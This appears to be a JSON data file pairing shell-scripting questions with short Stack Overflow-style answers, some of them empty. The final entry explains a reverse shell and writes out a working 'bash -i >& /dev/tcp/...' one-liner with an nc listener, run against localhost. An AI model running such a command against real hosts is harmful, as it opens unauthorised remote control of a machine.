    "How to overwrite a printed line in the shell with Ruby?": "You can use the \\r escape sequence at the end of the line (the next line will overwrite this line). Following your example:\nrequire 'time'\n\nloop do\n  time = Time.now.to_s + \"\\r\"\n  print time\n  $stdout.flush\n  sleep 1\nend",
    "Execute command in all immediate subdirectories": "Can you try using this simple loop which loops in all sub-directories at one level deep and execute commands on it,\nfor d in ./*/ ; do (cd \"$d\" && ls -al); done\n(cmd1 && cmd2) opens a sub-shell to run the commands. Since it is a child shell, the parent shell (the shell from which you're running this command) retains its current folder and other environment variables.\nWrap it around in a function in a proper zsh script as\n#!/bin/zsh\n\nfunction runCommand() {\n    for d in ./*/ ; do /bin/zsh -c \"(cd \"$d\" && \"$@\")\"; done\n}\n\nrunCommand \"ls -al\"\nshould work just fine for you.",
    "Wait for shell command to complete [duplicate]": "Use the WScript.Shell instead, because it has a waitOnReturn option:\nDim wsh As Object\nSet wsh = VBA.CreateObject(\"WScript.Shell\")\nDim waitOnReturn As Boolean: waitOnReturn = True\nDim windowStyle As Integer: windowStyle = 1\n\nwsh.Run \"C:\\folder\\runbat.bat\", windowStyle, waitOnReturn\n(Idea copied from Wait for Shell to finish, then format cells - synchronously execute a command)",
    "Search a string in a file and delete it from this file by Shell Script [duplicate]": "This should do it:\nsed -e s/deletethis//g -i *\nsed -e \"s/deletethis//g\" -i.backup *\nsed -e \"s/deletethis//g\" -i .backup *\nit will replace all occurrences of \"deletethis\" with \"\" (nothing) in all files (*), editing them in place.\nIn the second form the pattern can be edited a little safer, and it makes backups of any modified files, by suffixing them with \".backup\".\nThe third form is the way some versions of sed like it. (e.g. Mac OS X)\nman sed for more information.",
    "How to define a shell script with variable number of arguments?": "The bash variables $@ and $* expand into the list of command line arguments. Generally, you will want to use \"$@\" (that is, $@ surrounded by double quotes). This will do the right thing if someone passes your script an argument containing whitespace.\nSo if you had this in your script:\noutputfile=$1\nshift\ngs -dBATCH -dNOPAUSE -q -sDEVICE=pdfwrite -sOUTPUTFILE=$outputfile \"$@\"\nAnd you called your script like this:\nmyscript out.pdf foo.ps bar.ps \"another file.ps\"\nThis would expand to:\ngs -dBATCH -dNOPAUSE -q -sDEVICE=pdfwrite -sOUTPUTFILE=out.pdf foo.ps bar.ps \"another file.ps\"\nRead the \"Special Parameters\" section of the bash man page for more information.",
    "generating frequency table from file": "You mean you want a count of how many times an item appears in the input file? First sort it (using -n if the input is always numbers as in your example) then count the unique results.\nsort -n input.txt | uniq -c",
    "How to match a single quote in sed": "You can either use:\n\"texta'textb\" (APOSTROPHE inside QUOTATION MARKs)\nor\n'texta'\\''textb' (APOSTROPHE text APOSTROPHE, then REVERSE SOLIDUS, APOSTROPHE, then APOSTROPHE more text APOSTROPHE)\nI used unicode character names. REVERSE SOLIDUS is more commonly known as backslash.\nIn the latter case, you close your apostrophe, then shell-quote your apostrophe with a backslash, then open another apostrophe for the rest of the text.",
    "Getting $USER inside shell script when running with sudo?": "On my system the variable $SUDO_USER is set to the caller's user name.\nYou shouldn't extract the username from the ${HOME} variable directly. It's being configured and not calculated. To Extract the username you could take a look into /etc/passwd file, but this is very system dependent, e.g. sometimes you have to look into a LDAP directory or the entries are propagated through NIS ...",
    "How to delete the first column ( which is in fact row names) from a data file in linux?": "idiomatic use of cut will be\ncut -f2- input > output\nif you delimiter is tab (\"\\t\").\nOr, simply with awk magic (will work for both space and tab delimiter)\n awk '{$1=\"\"}1' input | awk '{$1=$1}1' > output\nfirst awk will delete field 1, but leaves a delimiter, second awk removes the delimiter. Default output delimiter will be space, if you want to change to tab, add -vOFS=\"\\t\" to the second awk.\nUPDATED\nBased on your updated input the problem is the initial spaces that cut treats as multiple columns. One way to address is to remove them first before feeding to cut\nsed 's/^ *//' input | cut -d\" \" -f2- > output\nor use the awk alternative above which will work in this case as well.",
    "How to change password of AWS Cognito User?": "",
    "qstat and long job names": "This on is a bit messy, but it works as a simple solution to have in the command history. All standard tools. Output is pretty much the same as what you get from a normal qstat call, but you won't get the headers:\nOne-liner:\nqstat -xml | tr '\\n' ' ' | sed 's#<job_list[^>]*>#\\n#g' \\\n  | sed 's#<[^>]*>##g' | grep \" \" | column -t\nDescription of commands:\nList jobs as XML:\nqstat -xml\nRemove all newlines:\ntr '\\n' ' '\nAdd newline before each job entry in the list:\nsed 's#<job_list[^>]*>#\\n#g'\nRemove all XML stuff:\nsed 's#<[^>]*>##g'\nHack to add newline at the end:\ngrep \" \"\nColumnize:\ncolumn -t\nExample output\n351996  0.50502  ProjectA_XXXXXXXXX_XXXX_XXXXXX                user123  r   2015-06-25T15:38:41  xxxxx-sim01@xxxxxx02.xxxxx.xxx  1\n351997  0.50502  ProjectA_XXX_XXXX_XXX                         user123  r   2015-06-25T15:39:26  xxxxx-sim01@xxxxxx23.xxxxx.xxx  1\n351998  0.50502  ProjectA_XXXXXXXXXXXXX_XXXX_XXXX              user123  r   2015-06-25T15:40:26  xxxxx-sim01@xxxxxx14.xxxxx.xxx  1\n351999  0.50502  ProjectA_XXXXXXXXXXXXXXXXX_XXXX_XXXX          user123  r   2015-06-25T15:42:11  xxxxx-sim01@xxxxxx19.xxxxx.xxx  1\n352001  0.50502  ProjectA_XXXXXXXXXXXXXXXXXXXXXXX_XXXX_XXXX    user123  r   2015-06-25T15:42:11  xxxxx-sim01@xxxxxx11.xxxxx.xxx  1\n352008  0.50501  runXXXX69                                     usr1     r   2015-06-25T15:49:04  xxxxx-sim01@xxxxxx17.xxxxx.xxx  1\n352009  0.50501  runXXXX70                                     usr1     r   2015-06-25T15:49:04  xxxxx-sim01@xxxxxx01.xxxxx.xxx  1\n352010  0.50501  runXXXX71                                     usr1     r   2015-06-25T15:49:04  xxxxx-sim01@xxxxxx06.xxxxx.xxx  1\n352011  0.50501  runXXXX72                                     usr1     r   2015-06-25T15:49:04  xxxxx-sim01@xxxxxx21.xxxxx.xxx  1\n352012  0.50501  runXXXX73                                     usr1     r   2015-06-25T15:49:04  xxxxx-sim01@xxxxxx13.xxxxx.xxx  1\n352013  0.50501  runXXXX74                                     usr1     r   2015-06-25T15:49:04  xxxxx-sim01@xxxxxx11.xxxxx.xxx  1",
    "Is there an equivalent of tail -f on Windows?": "In Powershell you can use Get-Content with the -Wait flag:\nGet-Content filename.log -Wait\nYou can shorten Get-Content to gc. That question suggested as a possible duplicate has an answer which mentions this and some useful extra parameters - see https://stackoverflow.com/a/188126. I'm not sure if it's really a duplicate, though, since that question is talking about general Windows alternatives to Linux tail, rather than about tail -f.",
    "Can I ssh somewhere, run some commands, and then leave myself a prompt?": "Probably the simplest thing is:\n$ ssh -t host 'cmd1; cmd2; sh -i'\nIf you want to set variables, do:\n$ ssh -t host 'cmd1; cmd2; FOO=hello sh -i'\nNote that this is a terrible hack, and you would be much better off putting your desired initial commands in a script and doing:\n$ scp setup host:~\n$ ssh host\nhost$ . setup",
    "zip error - Nothing to do [closed]": "To create a zipfile:\nFrom a list of files, zip myZippedImages.zip alice.png bob.jpg carl.svg. You need to specify both\nthe zipfile (output), and\nthe files you will zip (input).\nFrom a folder, zip -r myZippedImages.zip images_folder\nTo make it clearer than Alex's answer, to create a zip file, zip takes in a minimum of 2 arguments. How do I know, because when you use man zip, you get its man page, part of which is:\nzip  [-aABcdDeEfFghjklLmoqrRSTuvVwXyz!@$] [--longoption ...]  [-b path]\n       [-n suffixes] [-t date] [-tt date] [zipfile [file ...]]  [-xi list]\nand when you typed zip in the command line, you get:\nzip [-options] [-b path] [-t mmddyyyy] [-n suffixes] [zipfile list] [-xi list]\nIn both cases, notice [zipfile list] or [zipfile [file ...]]. The square brackets indicate something being optional. If you're not saving to a zipfile, then the list argument is not required.\nIf you want to save into a zipfile (choosing the [zipfile list] option, you need to also provide list, because it is within the square brackets. For this reason, I prefer the output of zip instead of man zip. (The man page might be confusing)",
    "How do you run Vim in Windows?": "When you install gVim:\nPlease make sure [\u2713] Create .bat files for command line use is checked.\nIt'll create several .bat files in C:\\Windows\\:\nC:\\>cd %windir%\nC:\\WINDOWS>dir /b *.bat\nevim.bat\ngview.bat\ngvim.bat\ngvimdiff.bat\nview.bat\nvim.bat\nvimdiff.bat\nvimtutor.bat\nNotice that: C:\\WINDOWS is already in the PATH environment variable.\nWhen you type vim in command line, C:\\WINDOWS\\vim.bat will be launched.\nIf you leave the checkbox mentioned above unchecked, you need to modify PATH manually.",
    "How to set the process name of a shell script?": "Here's a way to do it, it is a hack/workaround but it works pretty good. Feel free to tweak it to your needs, it certainly needs some checks on the symbolic link creation or using a tmp folder to avoid possible race conditions (if they are problematic in your case).\nDemonstration\nwrapper\n#!/bin/bash\nscript=\"./dummy\"\nnewname=\"./killme\"\n\nrm -iv \"$newname\"\n\nln -s \"$script\" \"$newname\"\n\nexec \"$newname\" \"$@\"\ndummy\n#!/bin/bash\necho \"I am $0\"\necho \"my params: $@\"\n\nps aux | grep bash\n\necho \"sleeping 10s... Kill me!\"\nsleep 10\nTest it using:\nchmod +x dummy wrapper\n./wrapper some params\nIn another terminal, kill it using:\nkillall killme\nNotes\nMake sure you can write in your current folder (current working directory).\nIf your current command is:\n/path/to/file -q --params somefile1 somefile2\nSet the script variable in wrapper to /path/to/file (instead of ./dummy) and call wrapper like this:\n./wrapper -q --params somefile1 somefile2",
    "In a unix shell, how to get yesterday's date into a variable?": "dt=$(date --date yesterday \"+%a %d/%m/%Y\")\necho $dt",
    "How do I get the default gateway in Linux given the destination?": "The ip route command from the iproute2 package can select routes without needing to use awk/grep, etc to do the selection.\nTo select the default route (from possibly many):\n$ ip -4 route show default  # use -6 instead of -4 for ipv6 selection.\ndefault via 172.28.206.254 dev wlp0s20f3 proto dhcp metric 600\nTo select the next hop for a particular interface:\n$ ip -4 route list type unicast dev eth0 exact 0/0  # Exact specificity\ndefault via 172.29.19.1 dev eth0\nIn case of multiple default gateways, you can select which one gets chosen as the next hop to a particular destination address:\n$ ip route get $(dig +short google.com | tail -1)\n173.194.34.134 via 172.28.206.254 dev wlan0  src 172.28.206.66 \n    cache\nYou can then extract the value using sed/awk/grep, etc. Here is one example using bash's read builtin:\n$ read _ _ gateway _ < <(ip route list match 0/0); echo \"$gateway\"\n172.28.206.254",
    "Parallel processing from a command queue on Linux (bash, python, ruby... whatever)": "On the shell, xargs can be used to queue parallel command processing. For example, for having always 3 sleeps in parallel, sleeping for 1 second each, and executing 10 sleeps in total do\necho {1..10} | xargs -d ' ' -n1 -P3 sh -c 'sleep 1s' _\nAnd it would sleep for 4 seconds in total. If you have a list of names, and want to pass the names to commands executed, again executing 3 commands in parallel, do\ncat names | xargs -n1 -P3 process_name\nWould execute the command process_name alice, process_name bob and so on.",
    "How do I echo stars (*) when reading password with `read`?": "As Mark Rushakoff pointed out, read -s will suppress the echoing of characters typed at the prompt. You can make use of that feature as part of this script to echo asterisks for each character typed:\n#!/bin/bash\nunset password\nprompt=\"Enter Password:\"\nwhile IFS= read -p \"$prompt\" -r -s -n 1 char\ndo\n    if [[ $char == $'\\0' ]]\n    then\n        break\n    fi\n    prompt='*'\n    password+=\"$char\"\ndone\necho\necho \"Done. Password=$password\"",
    "How to automatically accept the remote key when rsyncing?": "You can add this host's key to known_hosts beforehand like this:\nssh-keyscan $someip >> ~/.ssh/known_hosts",
    "How to extract only the raw contents of an ELF section?": "Use the -O binary output format:\nobjcopy -O binary --only-section=.text foobar.elf foobar.text\nJust verified with avr-objcopy and an AVR ELF image's .text section.\nNote that if, as Tim points out below, your section doesn't have the ALLOC flag, you may have to add --set-section-flags .text=alloc to be able to extract it.",
    "Why do I get a \"sqlite3: not found\" error on a rooted Nexus One when I try to open a database using the adb shell?": "",
    "Is there any way to find out changed file after some date in whole project code?": "#set timestamp for file    \ntouch --date \"2011-12-31\" /tmp/foo\n# Find files newer than 2011/Dec/31, in /some/files\nfind /some/files -newer /tmp/foo",
    "How to delete a substring using shell script": "Multiple ways, a selection:\nstr=abc.out\nShell:\necho ${str%.*}\nGrep:\necho $str | grep -o '^[^\\.]*'\nSed:\necho $str | sed -E 's/(.*?)\\..*/\\1/'\nAwk:\necho $str | awk -F. '{print $1}'\n-F. means split the string by . and $1 means the first column.\nCut:\necho $str | cut -d. -f1\nAll output:\nabc",
    "How do I install an R package from the source tarball on windows?": "",
    "Linux command to check if a shell script is running or not": "Check this\nps aux | grep \"aa.sh\"",
    "How would I get the current mouse coordinates in bash?": "To avoid all the sed/awk/cut stuff, you can use\nxdotool getmouselocation --shell\nIn particular,\neval $(xdotool getmouselocation --shell)\nwill put the position into shell variables X, Y and SCREEN. After that,\necho $X $Y\nwill give a snippet ready for a later xdotool mousemove or any other use.\nMy extra for sequential clicking into a few positions is a file positions.txt (given by a few eval/echo runs):\n123 13\n423 243\n232 989\nAnd the code that uses it is:\nwhile read line; do\n     X=`echo $line| cut -c1-3`; \n     Y=`echo $line| cut -c4-7`;\n     xdotool mousemove --sync $((  0.5 + $X )) $(( 0.5 + $Y ));\n     xdotool click 1\ndone < positions.txt\nIf there is no need to scale pixels (unlike my case), it could be a simple\nwhile read line; do\n     xdotool mousemove --sync $line;\n     xdotool click 1\ndone < positions.txt",
    "'\\r': command not found [duplicate]": "It seems that you have Windows style line endings (\\r\\n) - you need to change them to unix style (\\n). If you have dos2unix installed you could use it. You could also do it using sed or awk.",
    "Permission denied when trying to append a file to a root owned file with sudo [closed]": "Run bash as sudo:\n$ sudo bash -c \"cat add_file >> /etc/file\"\n\n$ whoami;sudo bash -c \"whoami\";whoami\niiSeymour\nroot\niiSeymour",
    "\"cd\" does not work in shell script": "I had the same problem. Turned out the problem was \\r\\n line endings.\nTo fix it, do\ntr -d \"\\r\" < oldname.sh > newname.sh\nFrom http://talk.maemo.org/showthread.php?s=1cadd53b369d5408c2b9d53580a32dc4&t=67836&page=2",
    "zsh in IntelliJ": "Confirmed! Available in IntelliJ 13",
    "Is there any mutex/semaphore mechanism in shell scripts?": "The BashFAQ noted by shellter has some good examples. The basic idea, which I'm moving here so the page is self-contained, is to use an operation that both tests and sets at the same time: mkdir\nmkdir will fail if the directory exists and will make it if it does not. It's an atomic operation and you can use it like so to do a mutex in your shell script (from the above BashFAQ)\n# Bourne\nlockdir=/tmp/myscript.lock\nif mkdir \"$lockdir\"\nthen    # directory did not exist, but was created successfully\n    echo >&2 \"successfully acquired lock: $lockdir\"\n    # continue script\nelse    # failed to create the directory, presumably because it already exists\n  echo >&2 \"cannot acquire lock, giving up on $lockdir\"\n  exit 0\nfi\nfollow the link for more detail on cleanup and other items.",
    "How to get PID from forked child process in shell script": "The PID of a backgrounded child process is stored in $!, and the current process is $$:\nfpfunction &\nchild_pid=$!     # in parent process, child's pid is $!\nparent_pid=$$    # in parent process, parent's pid is $$\nWhen in the backgrounded function, the child processes's PID is $BASHPID rather than $$, which is now the parent's PID:\nfpfunction() {\n    local child_pid=$BASHPID   # in child process, child's pid is $BASHPID\n    local parent_pid=$$        # in child process, parent's pid is $$\n    ...\n}\nAlso for what it's worth, you can combine the looping statements into a single C-like for loop:\nfor ((n = 1; n < 20; ++n)); do\n    echo \"Hello World-- $n times\"\n    sleep 2\n    echo \"Hello World2-- $n times\"\ndone",
    "How to grep exact literal string (no regex)": "Use fgrep, it's the same as grep -F (matches a fixed string).",
    "Is it possible to pipe the results of FIND to a COPY command CP?": "There's a little-used option for cp: -t destination -- see the man page:\nfind . -iname \"*.SomeExt\" | xargs cp -t Directory",
    "How to make awk ignore the field delimiter inside double quotes? [duplicate]": "From the GNU awk manual (http://www.gnu.org/software/gawk/manual/gawk.html#Splitting-By-Content):\n$ awk -vFPAT='([^,]*)|(\"[^\"]+\")' -vOFS=, '{print $1,$4}' file\n\"abc@xyz.com,www.example.com\",field4\n\"def@xyz.com\",field4\nand see What's the most robust way to efficiently parse CSV using awk? for more generally parsing CSVs that include newlines, etc. within fields.",
    "Should I use a Shebang with Bash scripts?": "On UNIX-like systems, you should always start scripts with a shebang line. The system call execve (which is responsible for starting programs) relies on an executable having either an executable header or a shebang line.\nFrom FreeBSD's execve manual page:\n The execve() system call transforms the calling process into a new\n process.  The new process is constructed from an ordinary file, whose\n name is pointed to by path, called the new process file.\n [...]\n\n This file is\n either an executable object file, or a file of data for an interpreter.\n\n [...]\n\n An interpreter file begins with a line of the form:\n\n       #! interpreter [arg]\n\n When an interpreter file is execve'd, the system actually execve's the\n specified interpreter.  If the optional arg is specified, it becomes the\n first argument to the interpreter, and the name of the originally\n execve'd file becomes the second argument\nSimilarly from the Linux manual page:\nexecve() executes the program pointed to by filename. filename must be either a binary executable, or a script starting with a line of the form:\n#! interpreter [optional-arg]\nIn fact, if a file doesn't have the right \"magic number\" in it's header, (like an ELF header or #!), execve will fail with the ENOEXEC error (again from FreeBSD's execve manpage):\n[ENOEXEC] The new process file has the appropriate access permission, but has an invalid magic number in its header.\nIf the file has executable permissions, but no shebang line but does seem to be a text file, the behaviour depends on the shell that you're running in.\nMost shells seem to start a new instance of themselves and feed it the file, see below.\nSince there is no guarantee that the script was actually written for that shell, this can work or fail spectacularly.\nFrom tcsh(1):\n   On  systems which do not understand the `#!' script interpreter conven\u2010\n   tion the shell may be compiled to emulate it;  see  the  version  shell\n   variable.  If so, the shell checks the first line of the file to see if\n   it is of the form `#!interpreter arg ...'.  If it is, the shell  starts\n   interpreter  with  the  given args and feeds the file to it on standard\n   input.\nFrom FreeBSD's sh(1):\nIf the program is not a normal executable file (i.e., if it\n     does not begin with the \u201cmagic number\u201d whose ASCII representation is\n     \u201c#!\u201d, resulting in an ENOEXEC return value from execve(2)) but appears to\n     be a text file, the shell will run a new instance of sh to interpret it.\nFrom bash(1):\n   If this execution fails because the file is not in  executable  format,\n   and  the file is not a directory, it is assumed to be a shell script, a\n   file containing shell commands.  A subshell is spawned to  execute  it.\nYou cannot always depend on the location of a non-standard program like bash. I've seen bash in /usr/bin, /usr/local/bin, /opt/fsf/bin and /opt/gnu/bin to name a few.\nSo it is generally a good idea to use env;\n#!/usr/bin/env bash\nIf you want your script to be portable, use sh instead of bash.\n#!/bin/sh\nWhile standards like POSIX do not guarantee the absolute paths of standard utilities, most UNIX-like systems seem to have sh in /bin and env in /usr/bin.",
    "List only directories names which match a pattern": "You are probably after the -d switch of ls:\nls -d *pattern*/\nls --directory *pattern*/",
    "How can I call a Python script on Excel VBA?": "Try this:\nRetVal = Shell(\"<full path to python.exe> \" & \"<full path to your python script>\")\nOr if the Python script is in the same folder as the workbook, then you can try:\nRetVal = Shell(\"<full path to python.exe> \" & ActiveWorkBook.Path & \"\\<python script name>\")\nAll details within <> are to be given. <> - indicates changeable fields\nI guess this should work. But then again, if your script is going to call other files which are in different folders, it can cause errors unless your script has properly handled it.",
    "Are there good Java libraries that facilitate building command-line applications? [closed]": "I've used the Apache Commons CLI library for command-line argument parsing. It's fairly easy to use and has reasonably good documentation.\nWhich library you choose probably comes down to which style of options you prefer (\"--gnu-style\" or \"-javac-style\").",
    "HIstory command only showing last 15 commands [duplicate]": "The history n command, where n is a number shows all history since line n.\nExample : To see last 100 commands use : history 100 or history -100",
    "How to resume screen?": "The wording is a little unlucky - this happens because there still is a screen session attached to 14313.pts-18.b-dev03 and you cannot simply \"resume\" a non-detached session. You need to use the -x option in addition to attaching to this session with a second screen instance (or, alternatively, detach the existing session first):\n-x\n  Attach to a not detached screen session. (Multi display mode).\n$ screen -xr 14313\nIf you wish to detach the first session instead:\n-d -r\n  Reattach a session and if necessary detach it first.\n$ screen -dr 14313",
    "Running shell script in parallel": "Another very handy way to do this is with gnu parallel, which is well worth installing if you don't already have it; this is invaluable if the tasks don't necessarily take the same amount of time.\nseq 1000 | parallel -j 8 --workdir $PWD ./myrun {}\nwill launch ./myrun 1, ./myrun 2, etc, making sure 8 jobs at a time are running. It can also take lists of nodes if you want to run on several nodes at once, eg in a PBS job; our instructions to our users for how to do that on our system are here.\nUpdated to add: You want to make sure you're using gnu-parallel, not the more limited utility of the same name that comes in the moreutils package (the divergent history of the two is described here.)",
    "What's the difference between escapeshellarg and escapeshellcmd?": "",
    "AWS not working working from Cronjob": "",
    "Override a variable in a Bash script from the command line": "You need to use parameter expansion for the variable(s) you want to override:\n$ cat override.sh\n#!/bin/bash\n\n: ${var1:=foo} # var1 will take on the value \"foo\" if not overridden\nvar2=${var2:-foo} # same thing but more typing\n\necho \"var1 is $var1 | var2 is $var2\"\nWithout Override Values\n$ ./override.sh\nvar1 is foo | var2 is foo\nWith Override Values\n$ var1=bar var2=baz ./override.sh\nvar1 is bar | var2 is baz",
    "How to add timestamp to STDERR redirection": "If you're talking about an up-to-date timestamp on each line, that's something you'd probably want to do in your actual script (but see below for a nifty solution if you have no power to change it). If you just want a marker date on its own line before your script starts writing, I'd use:\n( date 1>&2 ; myscript.sh ) 2>error.log\nWhat you need is a trick to pipe stderr through another program that can add timestamps to each line. You could do this with a C program but there's a far more devious way using just bash.\nFirst, create a script which will add the timestamp to each line (called predate.sh):\n#!/bin/bash\nwhile read line ; do\n    echo \"$(date): ${line}\"\ndone\nFor example:\n( echo a ; sleep 5 ; echo b ; sleep 2 ; echo c ) | ./predate.sh\nproduces:\nFri Oct  2 12:31:39 WAST 2009: a\nFri Oct  2 12:31:44 WAST 2009: b\nFri Oct  2 12:31:46 WAST 2009: c\nThen you need another trick that can swap stdout and stderr, this little monstrosity here:\n( myscript.sh 3>&1 1>&2- 2>&3- )\nThen it's simple to combine the two tricks by timestamping stdout and redirecting it to your file:\n( myscript.sh 3>&1 1>&2- 2>&3- ) | ./predate.sh >error.log\nThe following transcript shows this in action:\npax> cat predate.sh\n    #!/bin/bash\n    while read line ; do\n        echo \"$(date): ${line}\"\n    done\npax> cat tstdate.sh\n    #!/bin/bash\n    echo a to stderr then wait five seconds 1>&2\n    sleep 5\n    echo b to stderr then wait two seconds 1>&2\n    sleep 2\n    echo c to stderr 1>&2\n    echo d to stdout\npax> ( ( ./tstdate.sh ) 3>&1 1>&2- 2>&3- ) | ./predate.sh >error.log\n    d to stdout\npax> cat error.log\n    Fri Oct  2 12:49:40 WAST 2009: a to stderr then wait five seconds\n    Fri Oct  2 12:49:45 WAST 2009: b to stderr then wait two seconds\n    Fri Oct  2 12:49:47 WAST 2009: c to stderr\nAs already mentioned, predate.sh will prefix each line with a timestamp and the tstdate.sh is simply a test program to write to stdout and stderr with specific time gaps.\nWhen you run the command, you actually get \"d to stdout\" written to stderr (but that's your TTY device or whatever else stdout may have been when you started). The timestamped stderr lines are written to your desired file.",
    "Can I use ECHO to execute commands?": "Just put your command into parenthesis like this:\necho $(ls)\nYou can also have text before the command\necho \"The date is $(date)\"\nFor Example\necho \"Enter Text Here $(Command Here)\"",
    "How do I create an alias where the arguments go in the middle? [duplicate]": "Try defining a function in ~/.profile.\nfunction greplogs(){\n    grep \"$1\" */logs/*.log\n}",
    "Get mtime of specific file using Bash?": "stat can give you that info:\nfilemtime=$(stat -c %Y myfile.txt)\n%Y gives you the last modification as \"seconds since The Epoch\", but there are lots of other options; more info. So if the file was modified on 2011-01-22 at 15:30 GMT, the above would return a number in the region of 1295710237.\nEdit: Ah, you want the time in days since it was modified. That's going to be more complicated, not least because a \"day\" is not a fixed period of time (some \"days\" have only 23 hours, others 25 \u2014 thanks to daylight savings time).\nThe naive version might look like this:\nfilemtime=$(stat -c %Y \"$1\")\ncurrtime=$(date +%s)\ndiff=$(( (currtime - filemtime) / 86400 ))\necho $diff\n...but again, that's assuming a day is always exactly 86,400 second long.\nMore about arithmetic in bash here.",
    "Run sql file in database from terminal": "I presume that it is MYSQL. To run it from Unix / Linux environment you must do this:\n$ mysql -h \"server-name\" -u \"your_username\" -p \"your_password\" \"database-name\" < \"filename.sql\"\nThere is another way:\nmysql --host=localhost --user=your_username --password=your_password  -e \"filename.sql\"",
    "IO Redirection - Swapping stdout and stderr": "% (sh myscript.sh 3>&2 2>&1 1>&3) 2>/dev/null\nI'm stderr\n% (sh myscript.sh 3>&2 2>&1 1>&3) >/dev/null \nI'm stdout\nExplanation of 3>&2 2>&1 1>&3:\n3>&2 means make a copy of file descriptor 2 (fd 2) (stderr), named fd 3 (file descriptor 3). It copies the file descriptor, it doesn't duplicate the stream as tee does.\n2>&1 means that fd 2 of sh myscript.sh becomes a copy of it's fd 1 (stdout). Now, when myscript writes to it's stderr (it's fd 2), we receive it on stdout (our fd 1).\n1>&3 means that fd 1 of sh myscript.sh becomes a copy of fd 3 (stderr). Now, when myscript writes to it's stdout (it's fd 1), we receive it on stderr (our fd 2).",
    "Unix shell file copy flattening folder structure": "In bash:\nfind /foo -iname '*.txt' -exec cp \\{\\} /dest/ \\;\nfind will find all the files under the path /foo matching the wildcard *.txt, case insensitively (That's what -iname means). For each file, find will execute cp {} /dest/, with the found file in place of {}.",
    "Why does wget ignore the query string in the URL?": "& is a special character in most shell environments. You can use double quotes to quote the URL to pass the whole thing in as the parameter to wget:\nwget \"http://www.ted.com/talks/quick-list?sort=date&order=desc&page=18\"",
    "Integer expression expected error in shell script": "You can use this syntax:\n#!/bin/bash\n\necho \" Write in your age: \"\nread age\n\nif [[ \"$age\" -le 7 || \"$age\" -ge 65 ]] ; then\n    echo \" You can walk in for free \"\nelif [[ \"$age\" -gt 7 && \"$age\" -lt 65 ]] ; then\n    echo \" You have to pay for ticket \"\nfi",
    "Create a new file in git bash": "If you are using the Git Bash shell, you can use the following trick:\n> webpage.html\nThis is actually the same as:\necho \"\" > webpage.html\nThen, you can use git add webpage.html to stage the file.",
    "Assign AWK result to variable [duplicate]": "The following works correctly on bash:\n a=$(echo '111 222 33' | awk '{print $3;}' )\n echo $a # result is \"33\"\nAnother option would be to convert the string to an array:\n a=\"111 222 333\"\n b=($a)\n\n echo ${b[2]}  # returns 333",
    "Piping and Redirection": "Redirection is (mostly) for files (you redirect streams to/from files).\nPiping is for processes: you pipe (redirect) streams from one process to another.\nEssentially what you really do is \"connect\" one standard stream (usually stdout) of one process to standard stream of another process (usually stdin) via pipe.\nPipes have also the synchronization \"side effect\" : they block one process (on reading) when the other has nothing to write (yet) or when reading process cannot read fast enough (when the pipe's buffer is full).",
    "Combining echo and cat on Unix": "This should work:\necho \"PREPENDED STRING\" | cat - /tmp/file | sed 's/test/test2/g' > /tmp/result ",
    "Shell script working fine without shebang line? Why? [duplicate]": "The parent shell, where you entered ./myscript.sh, first tried to execve it, which is where the shebang line would take effect if present. When this works, the parent is unaware of the difference between scripts and ELFs because the kernel takes care of it.\nThe execve failed, so an ancient unix compatibility feature, predating the existence of shebang lines, was activated. It guessed that a file which has execute permission but is not recognized as a valid executable file by the kernel must be a shell script.\nUsually the parent shell guesses that the script is written for the same shell (minimal Bourne-like shells run the script with /bin/sh, bash runs it as a bash subprocess), csh does some more complicated guessing based on the first character because it predates shebang too and it needed to coexist with Bourne shell).\nYou need a shebang line when you know these guesses will be wrong (for example with the shebang is #!/usr/bin/perl), or when you don't trust the guessing to work consistently, or when the script needs to be runnable by a parent process that is not a shell itself.",
    "Bash script to run php script": "",
    "Convert a time span in seconds to formatted time in shell": "Here's a fun hacky way to do exactly what you are looking for =)\ndate -u -d @${i} +\"%T\"\nExplanation:\nThe date utility allows you to specify a time, from string, in seconds since 1970-01-01 00:00:00 UTC, and output it in whatever format you specify.\nThe -u option is to display UTC time, so it doesn't factor in timezone offsets (since start time from 1970 is in UTC)\nThe following parts are GNU date-specific (Linux):\nThe -d part tells date to accept the time information from string instead of using now\nThe @${i} part is how you tell date that $i is in seconds\nThe +\"%T\" is for formatting your output. From the man date page: %T     time; same as %H:%M:%S. Since we only care about the HH:MM:SS part, this fits!",
    "Batch convert latin-1 files to utf-8 using iconv": "You shouldn't use ls like that and a for loop is not appropriate either. Also, the destination directory should be outside the source directory.\nmkdir /path/to/destination\nfind . -type f -exec iconv -f iso-8859-1 -t utf-8 \"{}\" -o /path/to/destination/\"{}\" \\;\nNo need for a loop. The -type f option includes files and excludes directories.\nEdit:\nThe OS X version of iconv doesn't have the -o option. Try this:\nfind . -type f -exec bash -c 'iconv -f iso-8859-1 -t utf-8 \"{}\" > /path/to/destination/\"{}\"' \\;",
    "How to read the second-to-last line in a file using Bash?": "Try this:\ntail -2 yourfile | head -1",
    "Control mouse by writing to /dev/input/mice": "this is not trough the file you mentioned, but its way quicker to use this tool instead of decypering the dump of that file. And it does everything you want in bash.\nxdotool does the trick in my terminal.\nthis is the package site for ubuntu. you probably can install it trough\n# apt-get install xdotool\nI could just emerge it on gentoo without adding any repositories.\nthe tool works fairly simple:\n#! /bin/bash\n# move the mouse  x    y\nxdotool mousemove 1800 500\n# left click\nxdotool click 1\n# right click\nxdotool click 3\nfound it here",
    "What is a reverse shell? [closed]": "It's a(n insecure) remote shell introduced by the target. That's the opposite of a \"normal\" remote shell, that is introduced by the source.\nLet's try it with localhost instead of 10.0.0.1:\nOpen two tabs in your terminal.\nopen TCP port 8080 and wait for a connection:\nnc localhost -lp 8080\nOpen an interactive shell, and redirect the IO streams to a TCP socket:\nbash -i >& /dev/tcp/localhost/8080 0>&1\nwhere\nbash -i \"If the -i option is present, the shell is interactive.\"\n>& \"This special syntax redirects both, stdout and stderr to the specified target.\"\n(argument for >&) /dev/tcp/localhost/8080 is a TCP client connection to localhost:8080.\n0>&1 redirect file descriptor 0 (stdin) to fd 1 (stdout), hence the opened TCP socket is used to read input.\nCf. http://wiki.bash-hackers.org/syntax/redirection\nRejoice as you have a prompt in tab 1.\nNow imagine not using localhost, but some remote IP.",
